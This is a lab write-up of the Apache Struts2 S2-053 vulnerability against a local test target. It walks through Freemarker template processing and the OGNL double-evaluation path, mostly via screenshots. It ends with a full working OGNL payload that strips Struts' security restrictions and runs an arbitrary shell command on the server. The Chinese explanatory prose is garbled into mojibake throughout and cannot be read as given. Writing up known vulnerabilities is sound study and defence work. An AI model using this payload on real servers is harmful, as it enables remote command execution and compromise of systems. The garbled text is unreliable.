### S2-053

![s2-053-result](../imgs/s2-053-result.png)  

Struts2 åœ¨ä½¿ç”¨ Freemarker æ¨¡æ¿å¼•æ“çš„æ—¶å€™ï¼ŒåŒæ—¶å…è®¸è§£æ OGNL è¡¨è¾¾å¼ã€‚å¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœ¬èº«ä¸ä¼šè¢« OGNL è§£æï¼Œä½†ç”±äºè¢« Freemarker è§£æä¸€æ¬¡åå˜æˆç¦»å¼€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¢« OGNL è§£æç¬¬äºŒæ¬¡ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚  
http://localhost:9053/hello.action

* Freemarker å·¥ä½œåŸç†  
  
  ![](https://img-blog.csdn.net/20180809213845347?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzODE5NzY0/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)  

  åŸç†ç®€è¿°
  - å‡†å¤‡æ¨¡æ¿æ–‡ä»¶(åç¼€ä¸º.fld)
  - å°†æ•°æ®å¡«å……è¿›æ¨¡æ¿
  - è¾“å‡ºæœ€ç»ˆé¡µé¢æ–‡ä»¶
  
  å…·ä½“è¿‡ç¨‹
  - åˆ›å»ºä¸€ä¸ª Configuration å¯¹è±¡
  - è®¾ç½®æ¨¡æ¿æ–‡ä»¶æ‰€åœ¨è·¯å¾„
  - è®¾ç½®æ¨¡æ¿æ–‡ä»¶æ‰€ä½¿ç”¨çš„å­—ç¬¦é›†
  - æ ¹æ®è·¯å¾„åŠ è½½æ¨¡æ¿æ–‡ä»¶ï¼Œåˆ›å»ºæ¨¡æ¿å¯¹è±¡
  - åˆ›å»ºæ•°æ®é›†å¯¹è±¡ï¼Œå¹¶å‘å¯¹è±¡å¡«å……æ•°æ®
  - åˆ›å»ºè¾“å‡ºæµå¯¹è±¡ Writerï¼ˆæ­¤æ­¥éª¤æ˜¯è®¾ç½®è¾“å‡ºçš„æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„åŠå…¶åå­—ï¼‰
  - è°ƒç”¨æ¨¡æ¿å¯¹è±¡çš„processæ–¹æ³•è¾“å‡ºï¼ˆç”Ÿæˆï¼‰HTMLæ–‡ä»¶æˆ–å…¶ä»–æ–‡ä»¶
  - å…³é—­æµå¯¹è±¡


* æ¼æ´åˆ†æ  
  
  å‚è€ƒ [s2-053 æºç åˆ†æ](https://zhuanlan.zhihu.com/p/146166297)  

  (ğŸ‘‡) è¯¥æ–¹æ³•é¦–å…ˆè·å–æ¨¡ç‰ˆçš„ç»å¯¹è·¯å¾„ï¼Œå†é€šè¿‡ configuration.getTemplate è·å–æ¨¡ç‰ˆçš„ä¿¡æ¯ï¼Œç„¶åè°ƒç”¨ template.process(model, writer) å¼€å§‹è§£ææ¨¡ç‰ˆ  

  ![s2-053-01](https://pic3.zhimg.com/80/v2-4203979ae2ce8ba10d2fed50eb15bb1e_720w.webp)  

  (ğŸ‘‡) ç»è¿‡ä¸€ç³»åˆ—çš„å‡½æ•°è°ƒç”¨åï¼ˆæœ‰äº›å¤æ‚ï¼‰ï¼Œåœ¨ä¸€ä¸ª visit æ–¹æ³•ä¸­ï¼Œè°ƒç”¨ä¼ è¿›å»çš„ `element.accept` æ–¹æ³•éå† nestedElements ä¸­å…ƒç´ è¿›è¡Œè§£æï¼ŒnestedElements çš„å†…å®¹å¦‚ä¸‹:  
  
  ![s2-053-02](https://pic3.zhimg.com/80/v2-4e024b73be574034956442d4363bfff2_720w.webp)  

  ![s2-053-03](https://pic3.zhimg.com/80/v2-58ee5b629f4a2e4b83a31aad495ed4e6_720w.webp)  

  ![s2-053-04](https://pic3.zhimg.com/80/v2-e264a755c26becb110fa63a4050f10c2_720w.webp)  

  (â˜) å…¶ä¸­çš„ `${redirectUri}` åº”è¯¥å°±æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯æ³¨å…¥æ¼æ´ç‚¹  
  
  (ğŸ‘‡) çœ‹å¦‚ä½•è§£æ `<@s.url value="${redirectUri}"></@s.url>`ã€‚è°ƒç”¨ `UnifiedCall.accept` æ–¹æ³•  
  
  (ğŸ‘‡) è¯¥æ–¹æ³•é¦–å…ˆä» valueStack è·å–åˆ° redirect_url çš„å€¼,æ”¾å…¥ args,ç„¶åå¼€å§‹è§£æè¿™ä¸ªå€¼ã€‚  

  ![s2-053-05](https://pic2.zhimg.com/80/v2-d28ef4c8e6b61a06e641182158c80401_720w.webp)  

  (ğŸ‘‡) å†ç»è¿‡ä¸€ç³»åˆ—çš„å¤æ‚çš„è°ƒç”¨ï¼Œè°ƒç”¨åˆ°äº† `findValue` æ–¹æ³•ã€‚çº¢æ¡†ä¸Šé¢çš„åˆ¤æ–­è¯­å¥é¦–å…ˆåˆ¤æ–­æ˜¯å¦æ”¯æŒ `altSyntax`ã€‚Syntax åŠŸèƒ½æ˜¯ Struts 2 æ¡†æ¶ç”¨äºå¤„ç†æ ‡ç­¾å†…å®¹çš„ä¸€ç§æ–°è¯­æ³•ï¼ˆä¸åŒäºæ™®é€šçš„ HTML ï¼‰ï¼Œä¸»è¦ä½œç”¨åœ¨äºæ”¯æŒå¯¹æ ‡ç­¾ä¸­çš„ OGNL è¡¨è¾¾å¼è¿›è¡Œè§£æå¹¶æ‰§è¡Œã€‚æ¥ç€è°ƒç”¨ TextParseUtil.translateVariables æ–¹æ³•ã€‚expr å°±æ˜¯æˆ‘ä»¬çš„ payloadã€‚ï¼ˆè¿™é‡Œæ˜¯%{1+1}ï¼‰  

  ![s2-053-06](https://pic2.zhimg.com/80/v2-b0402f7b1b2195b53268b4021087a3cd_720w.webp)  

  ![s2-053-07](https://pic1.zhimg.com/80/v2-ff20fa903468fe25a918ee1cd0903bd4_720w.webp)  

  ![s2-053-08](https://pic4.zhimg.com/80/v2-b6877d56a0fac03d3a12fed301f7fbe3_720w.webp)

  (â˜) å†ç»è¿‡ä¸€ç³»åˆ—çš„è°ƒç”¨ï¼Œä¼šä¸€ç›´æ‰§è¡Œåˆ° `parser.evaluate()` æ–¹æ³•ã€‚`parser.evaluate()` çš„ä¸»è¦ä½œç”¨å°±æ˜¯ï¼Œå¯¹ payload è¿›è¡Œåˆ‡å‰²,ä¿ç•™ `%{}` é‡Œé¢çš„å€¼,ç„¶åå†è°ƒç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œæœ€ç»ˆè§£æã€‚  

  (ğŸ‘‡) æœ€ç»ˆï¼Œè°ƒç”¨åˆ°äº† `getValue()` æ–¹æ³•ï¼Œæ‰§è¡Œäº† ognl è¡¨è¾¾å¼  
  
  ![s2-053-09](https://pic3.zhimg.com/80/v2-21e16827b3cb09171bb783a4d8e2e5f2_720w.webp)  

  ![s2-053-10](https://pic4.zhimg.com/80/v2-7327e05c44968708fdaabe18aa9ce8bb_720w.webp)



* payload

  ```
  %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}

  ```